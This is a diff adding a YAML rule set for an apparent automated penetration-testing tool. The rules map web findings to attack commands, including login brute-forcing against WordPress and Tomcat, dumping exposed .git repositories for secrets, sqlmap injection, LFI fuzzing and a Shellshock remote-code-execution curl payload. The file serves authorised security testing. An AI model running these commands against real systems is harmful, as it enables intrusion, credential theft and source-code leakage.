@@ -1,0 +1,160 @@
+# ─────────────────────────────────────────────────
+# Web application attack rules
+# Fires when web-specific findings exist in state
+# ─────────────────────────────────────────────────
+
+# ── Discovery ────────────────────────────────────
+
+- id: web_dir_fuzz_80
+  name: Web Directory Fuzzing (HTTP)
+  description: Discover hidden directories and files on the HTTP service.
+  priority: P1
+  conditions:
+    require_ports: [80]
+  command_template: capo web fuzz
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web
+
+- id: web_dir_fuzz_443
+  name: Web Directory Fuzzing (HTTPS)
+  description: Discover hidden directories and files on the HTTPS service.
+  priority: P1
+  conditions:
+    require_ports: [443]
+  command_template: capo web fuzz --port 443 --https
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web
+
+- id: web_vhost_fuzz
+  name: Virtual Host Fuzzing
+  description: Discover hidden vhosts on the target web server.
+  priority: P2
+  conditions:
+    require_ports: [80]
+    require_state: [has_domain]
+  command_template: capo web vhost -d {DOMAIN}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/vhost-fuzzing
+
+- id: web_subdomain_fuzz
+  name: Subdomain Fuzzing
+  description: Brute-force subdomains against the DNS service.
+  priority: P2
+  conditions:
+    require_ports: [53]
+    require_state: [has_domain]
+  command_template: capo web subdns -d {DOMAIN}
+  source_reference: https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology
+
+# ── CMS / Framework Detection ────────────────────
+
+- id: web_wordpress
+  name: WordPress Enumeration
+  description: WordPress paths found — enumerate plugins, themes, and users.
+  priority: P1
+  conditions:
+    require_ports: [80]
+    jmespath: "length(directories[?contains(path, 'wp-')]) > `0`"
+  command_template: wpscan --url http://{IP} -e ap,at,u --api-token $WPSCAN_TOKEN
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
+
+- id: web_wordpress_brute
+  name: WordPress Login Brute-Force
+  description: Brute-force wp-login with known users.
+  priority: P2
+  conditions:
+    require_ports: [80]
+    require_state: [has_valid_user]
+    jmespath: "length(directories[?contains(path, 'wp-')]) > `0`"
+  command_template: wpscan --url http://{IP} -U {USERFILE} -P {PASSFILE} --password-attack xmlrpc
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
+
+- id: web_drupal
+  name: Drupal Enumeration
+  description: Drupal paths detected — enumerate version and modules.
+  priority: P1
+  conditions:
+    require_ports: [80]
+    jmespath: "length(directories[?contains(path, 'drupal') || contains(path, 'sites/default')]) > `0`"
+  command_template: droopescan scan drupal -u http://{IP}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal
+
+- id: web_joomla
+  name: Joomla Enumeration
+  description: Joomla paths detected — enumerate version and components.
+  priority: P1
+  conditions:
+    require_ports: [80]
+    jmespath: "length(directories[?contains(path, 'joomla') || contains(path, 'administrator')]) > `0`"
+  command_template: joomscan -u http://{IP}
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
+
+- id: web_tomcat
+  name: Tomcat Manager Brute-Force
+  description: Tomcat manager page found — attempt default credential brute-force.
+  priority: P1
+  conditions:
+    require_ports: [8080]
+    jmespath: "length(directories[?contains(path, 'manager') || contains(path, 'host-manager')]) > `0`"
+  command_template: "capo brute http-get http://{IP}:8080/manager/html -U {USERFILE} -P {PASSFILE}"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
+
+# ── Vulnerability Classes ────────────────────────
+
+- id: web_git_exposure
+  name: Git Repository Exposure
+  description: .git directory found — dump source code and search for secrets.
+  priority: P1
+  conditions:
+    require_ports: [80]
+    jmespath: "length(directories[?contains(path, '.git')]) > `0`"
+  command_template: git-dumper http://{IP}/.git ./git-dump && trufflehog filesystem ./git-dump
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/git-leak
+
+- id: web_shellshock
+  name: Shellshock (CVE-2014-6271)
+  description: CGI-bin found — test for Shellshock RCE via User-Agent header.
+  priority: P1
+  conditions:
+    require_ports: [80]
+    jmespath: "length(directories[?contains(path, 'cgi-bin')]) > `0`"
+  command_template: "curl -A '() { :; }; echo; /usr/bin/id' http://{IP}/cgi-bin/"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi
+
+- id: web_lfi_test
+  name: LFI/Path Traversal Test
+  description: Test common LFI payloads against discovered parameters.
+  priority: P2
+  conditions:
+    require_ports: [80]
+    jmespath: "length(directories) > `5`"
+  command_template: "ffuf -u 'http://{IP}/FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0"
+  source_reference: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+
+- id: web_sqli_test
+  name: SQL Injection Discovery
+  description: Test discovered URLs for SQL injection.
+  priority: P2
+  conditions:
+    require_ports: [80]
+    jmespath: "length(directories) > `3`"
+  command_template: "sqlmap -u 'http://{IP}/' --crawl=2 --batch --risk=1 --level=1"
+  source_reference: https://book.hacktricks.xyz/pentesting-web/sql-injection
+
+# ── Authenticated Web ────────────────────────────
+
+- id: web_auth_dir_fuzz
+  name: Authenticated Directory Fuzzing
+  description: Re-fuzz directories with discovered credentials for authenticated paths.
+  priority: P2
+  conditions:
+    require_ports: [80]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: "feroxbuster -u http://{IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --cookies 'session=AUTH_COOKIE'"
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web
+
+- id: web_nikto
+  name: Nikto Vulnerability Scan
+  description: Run Nikto web vulnerability scanner for misconfigurations and known CVEs.
+  priority: P3
+  conditions:
+    require_ports: [80]
+  command_template: nikto -h http://{IP} -o nikto.txt
+  source_reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web
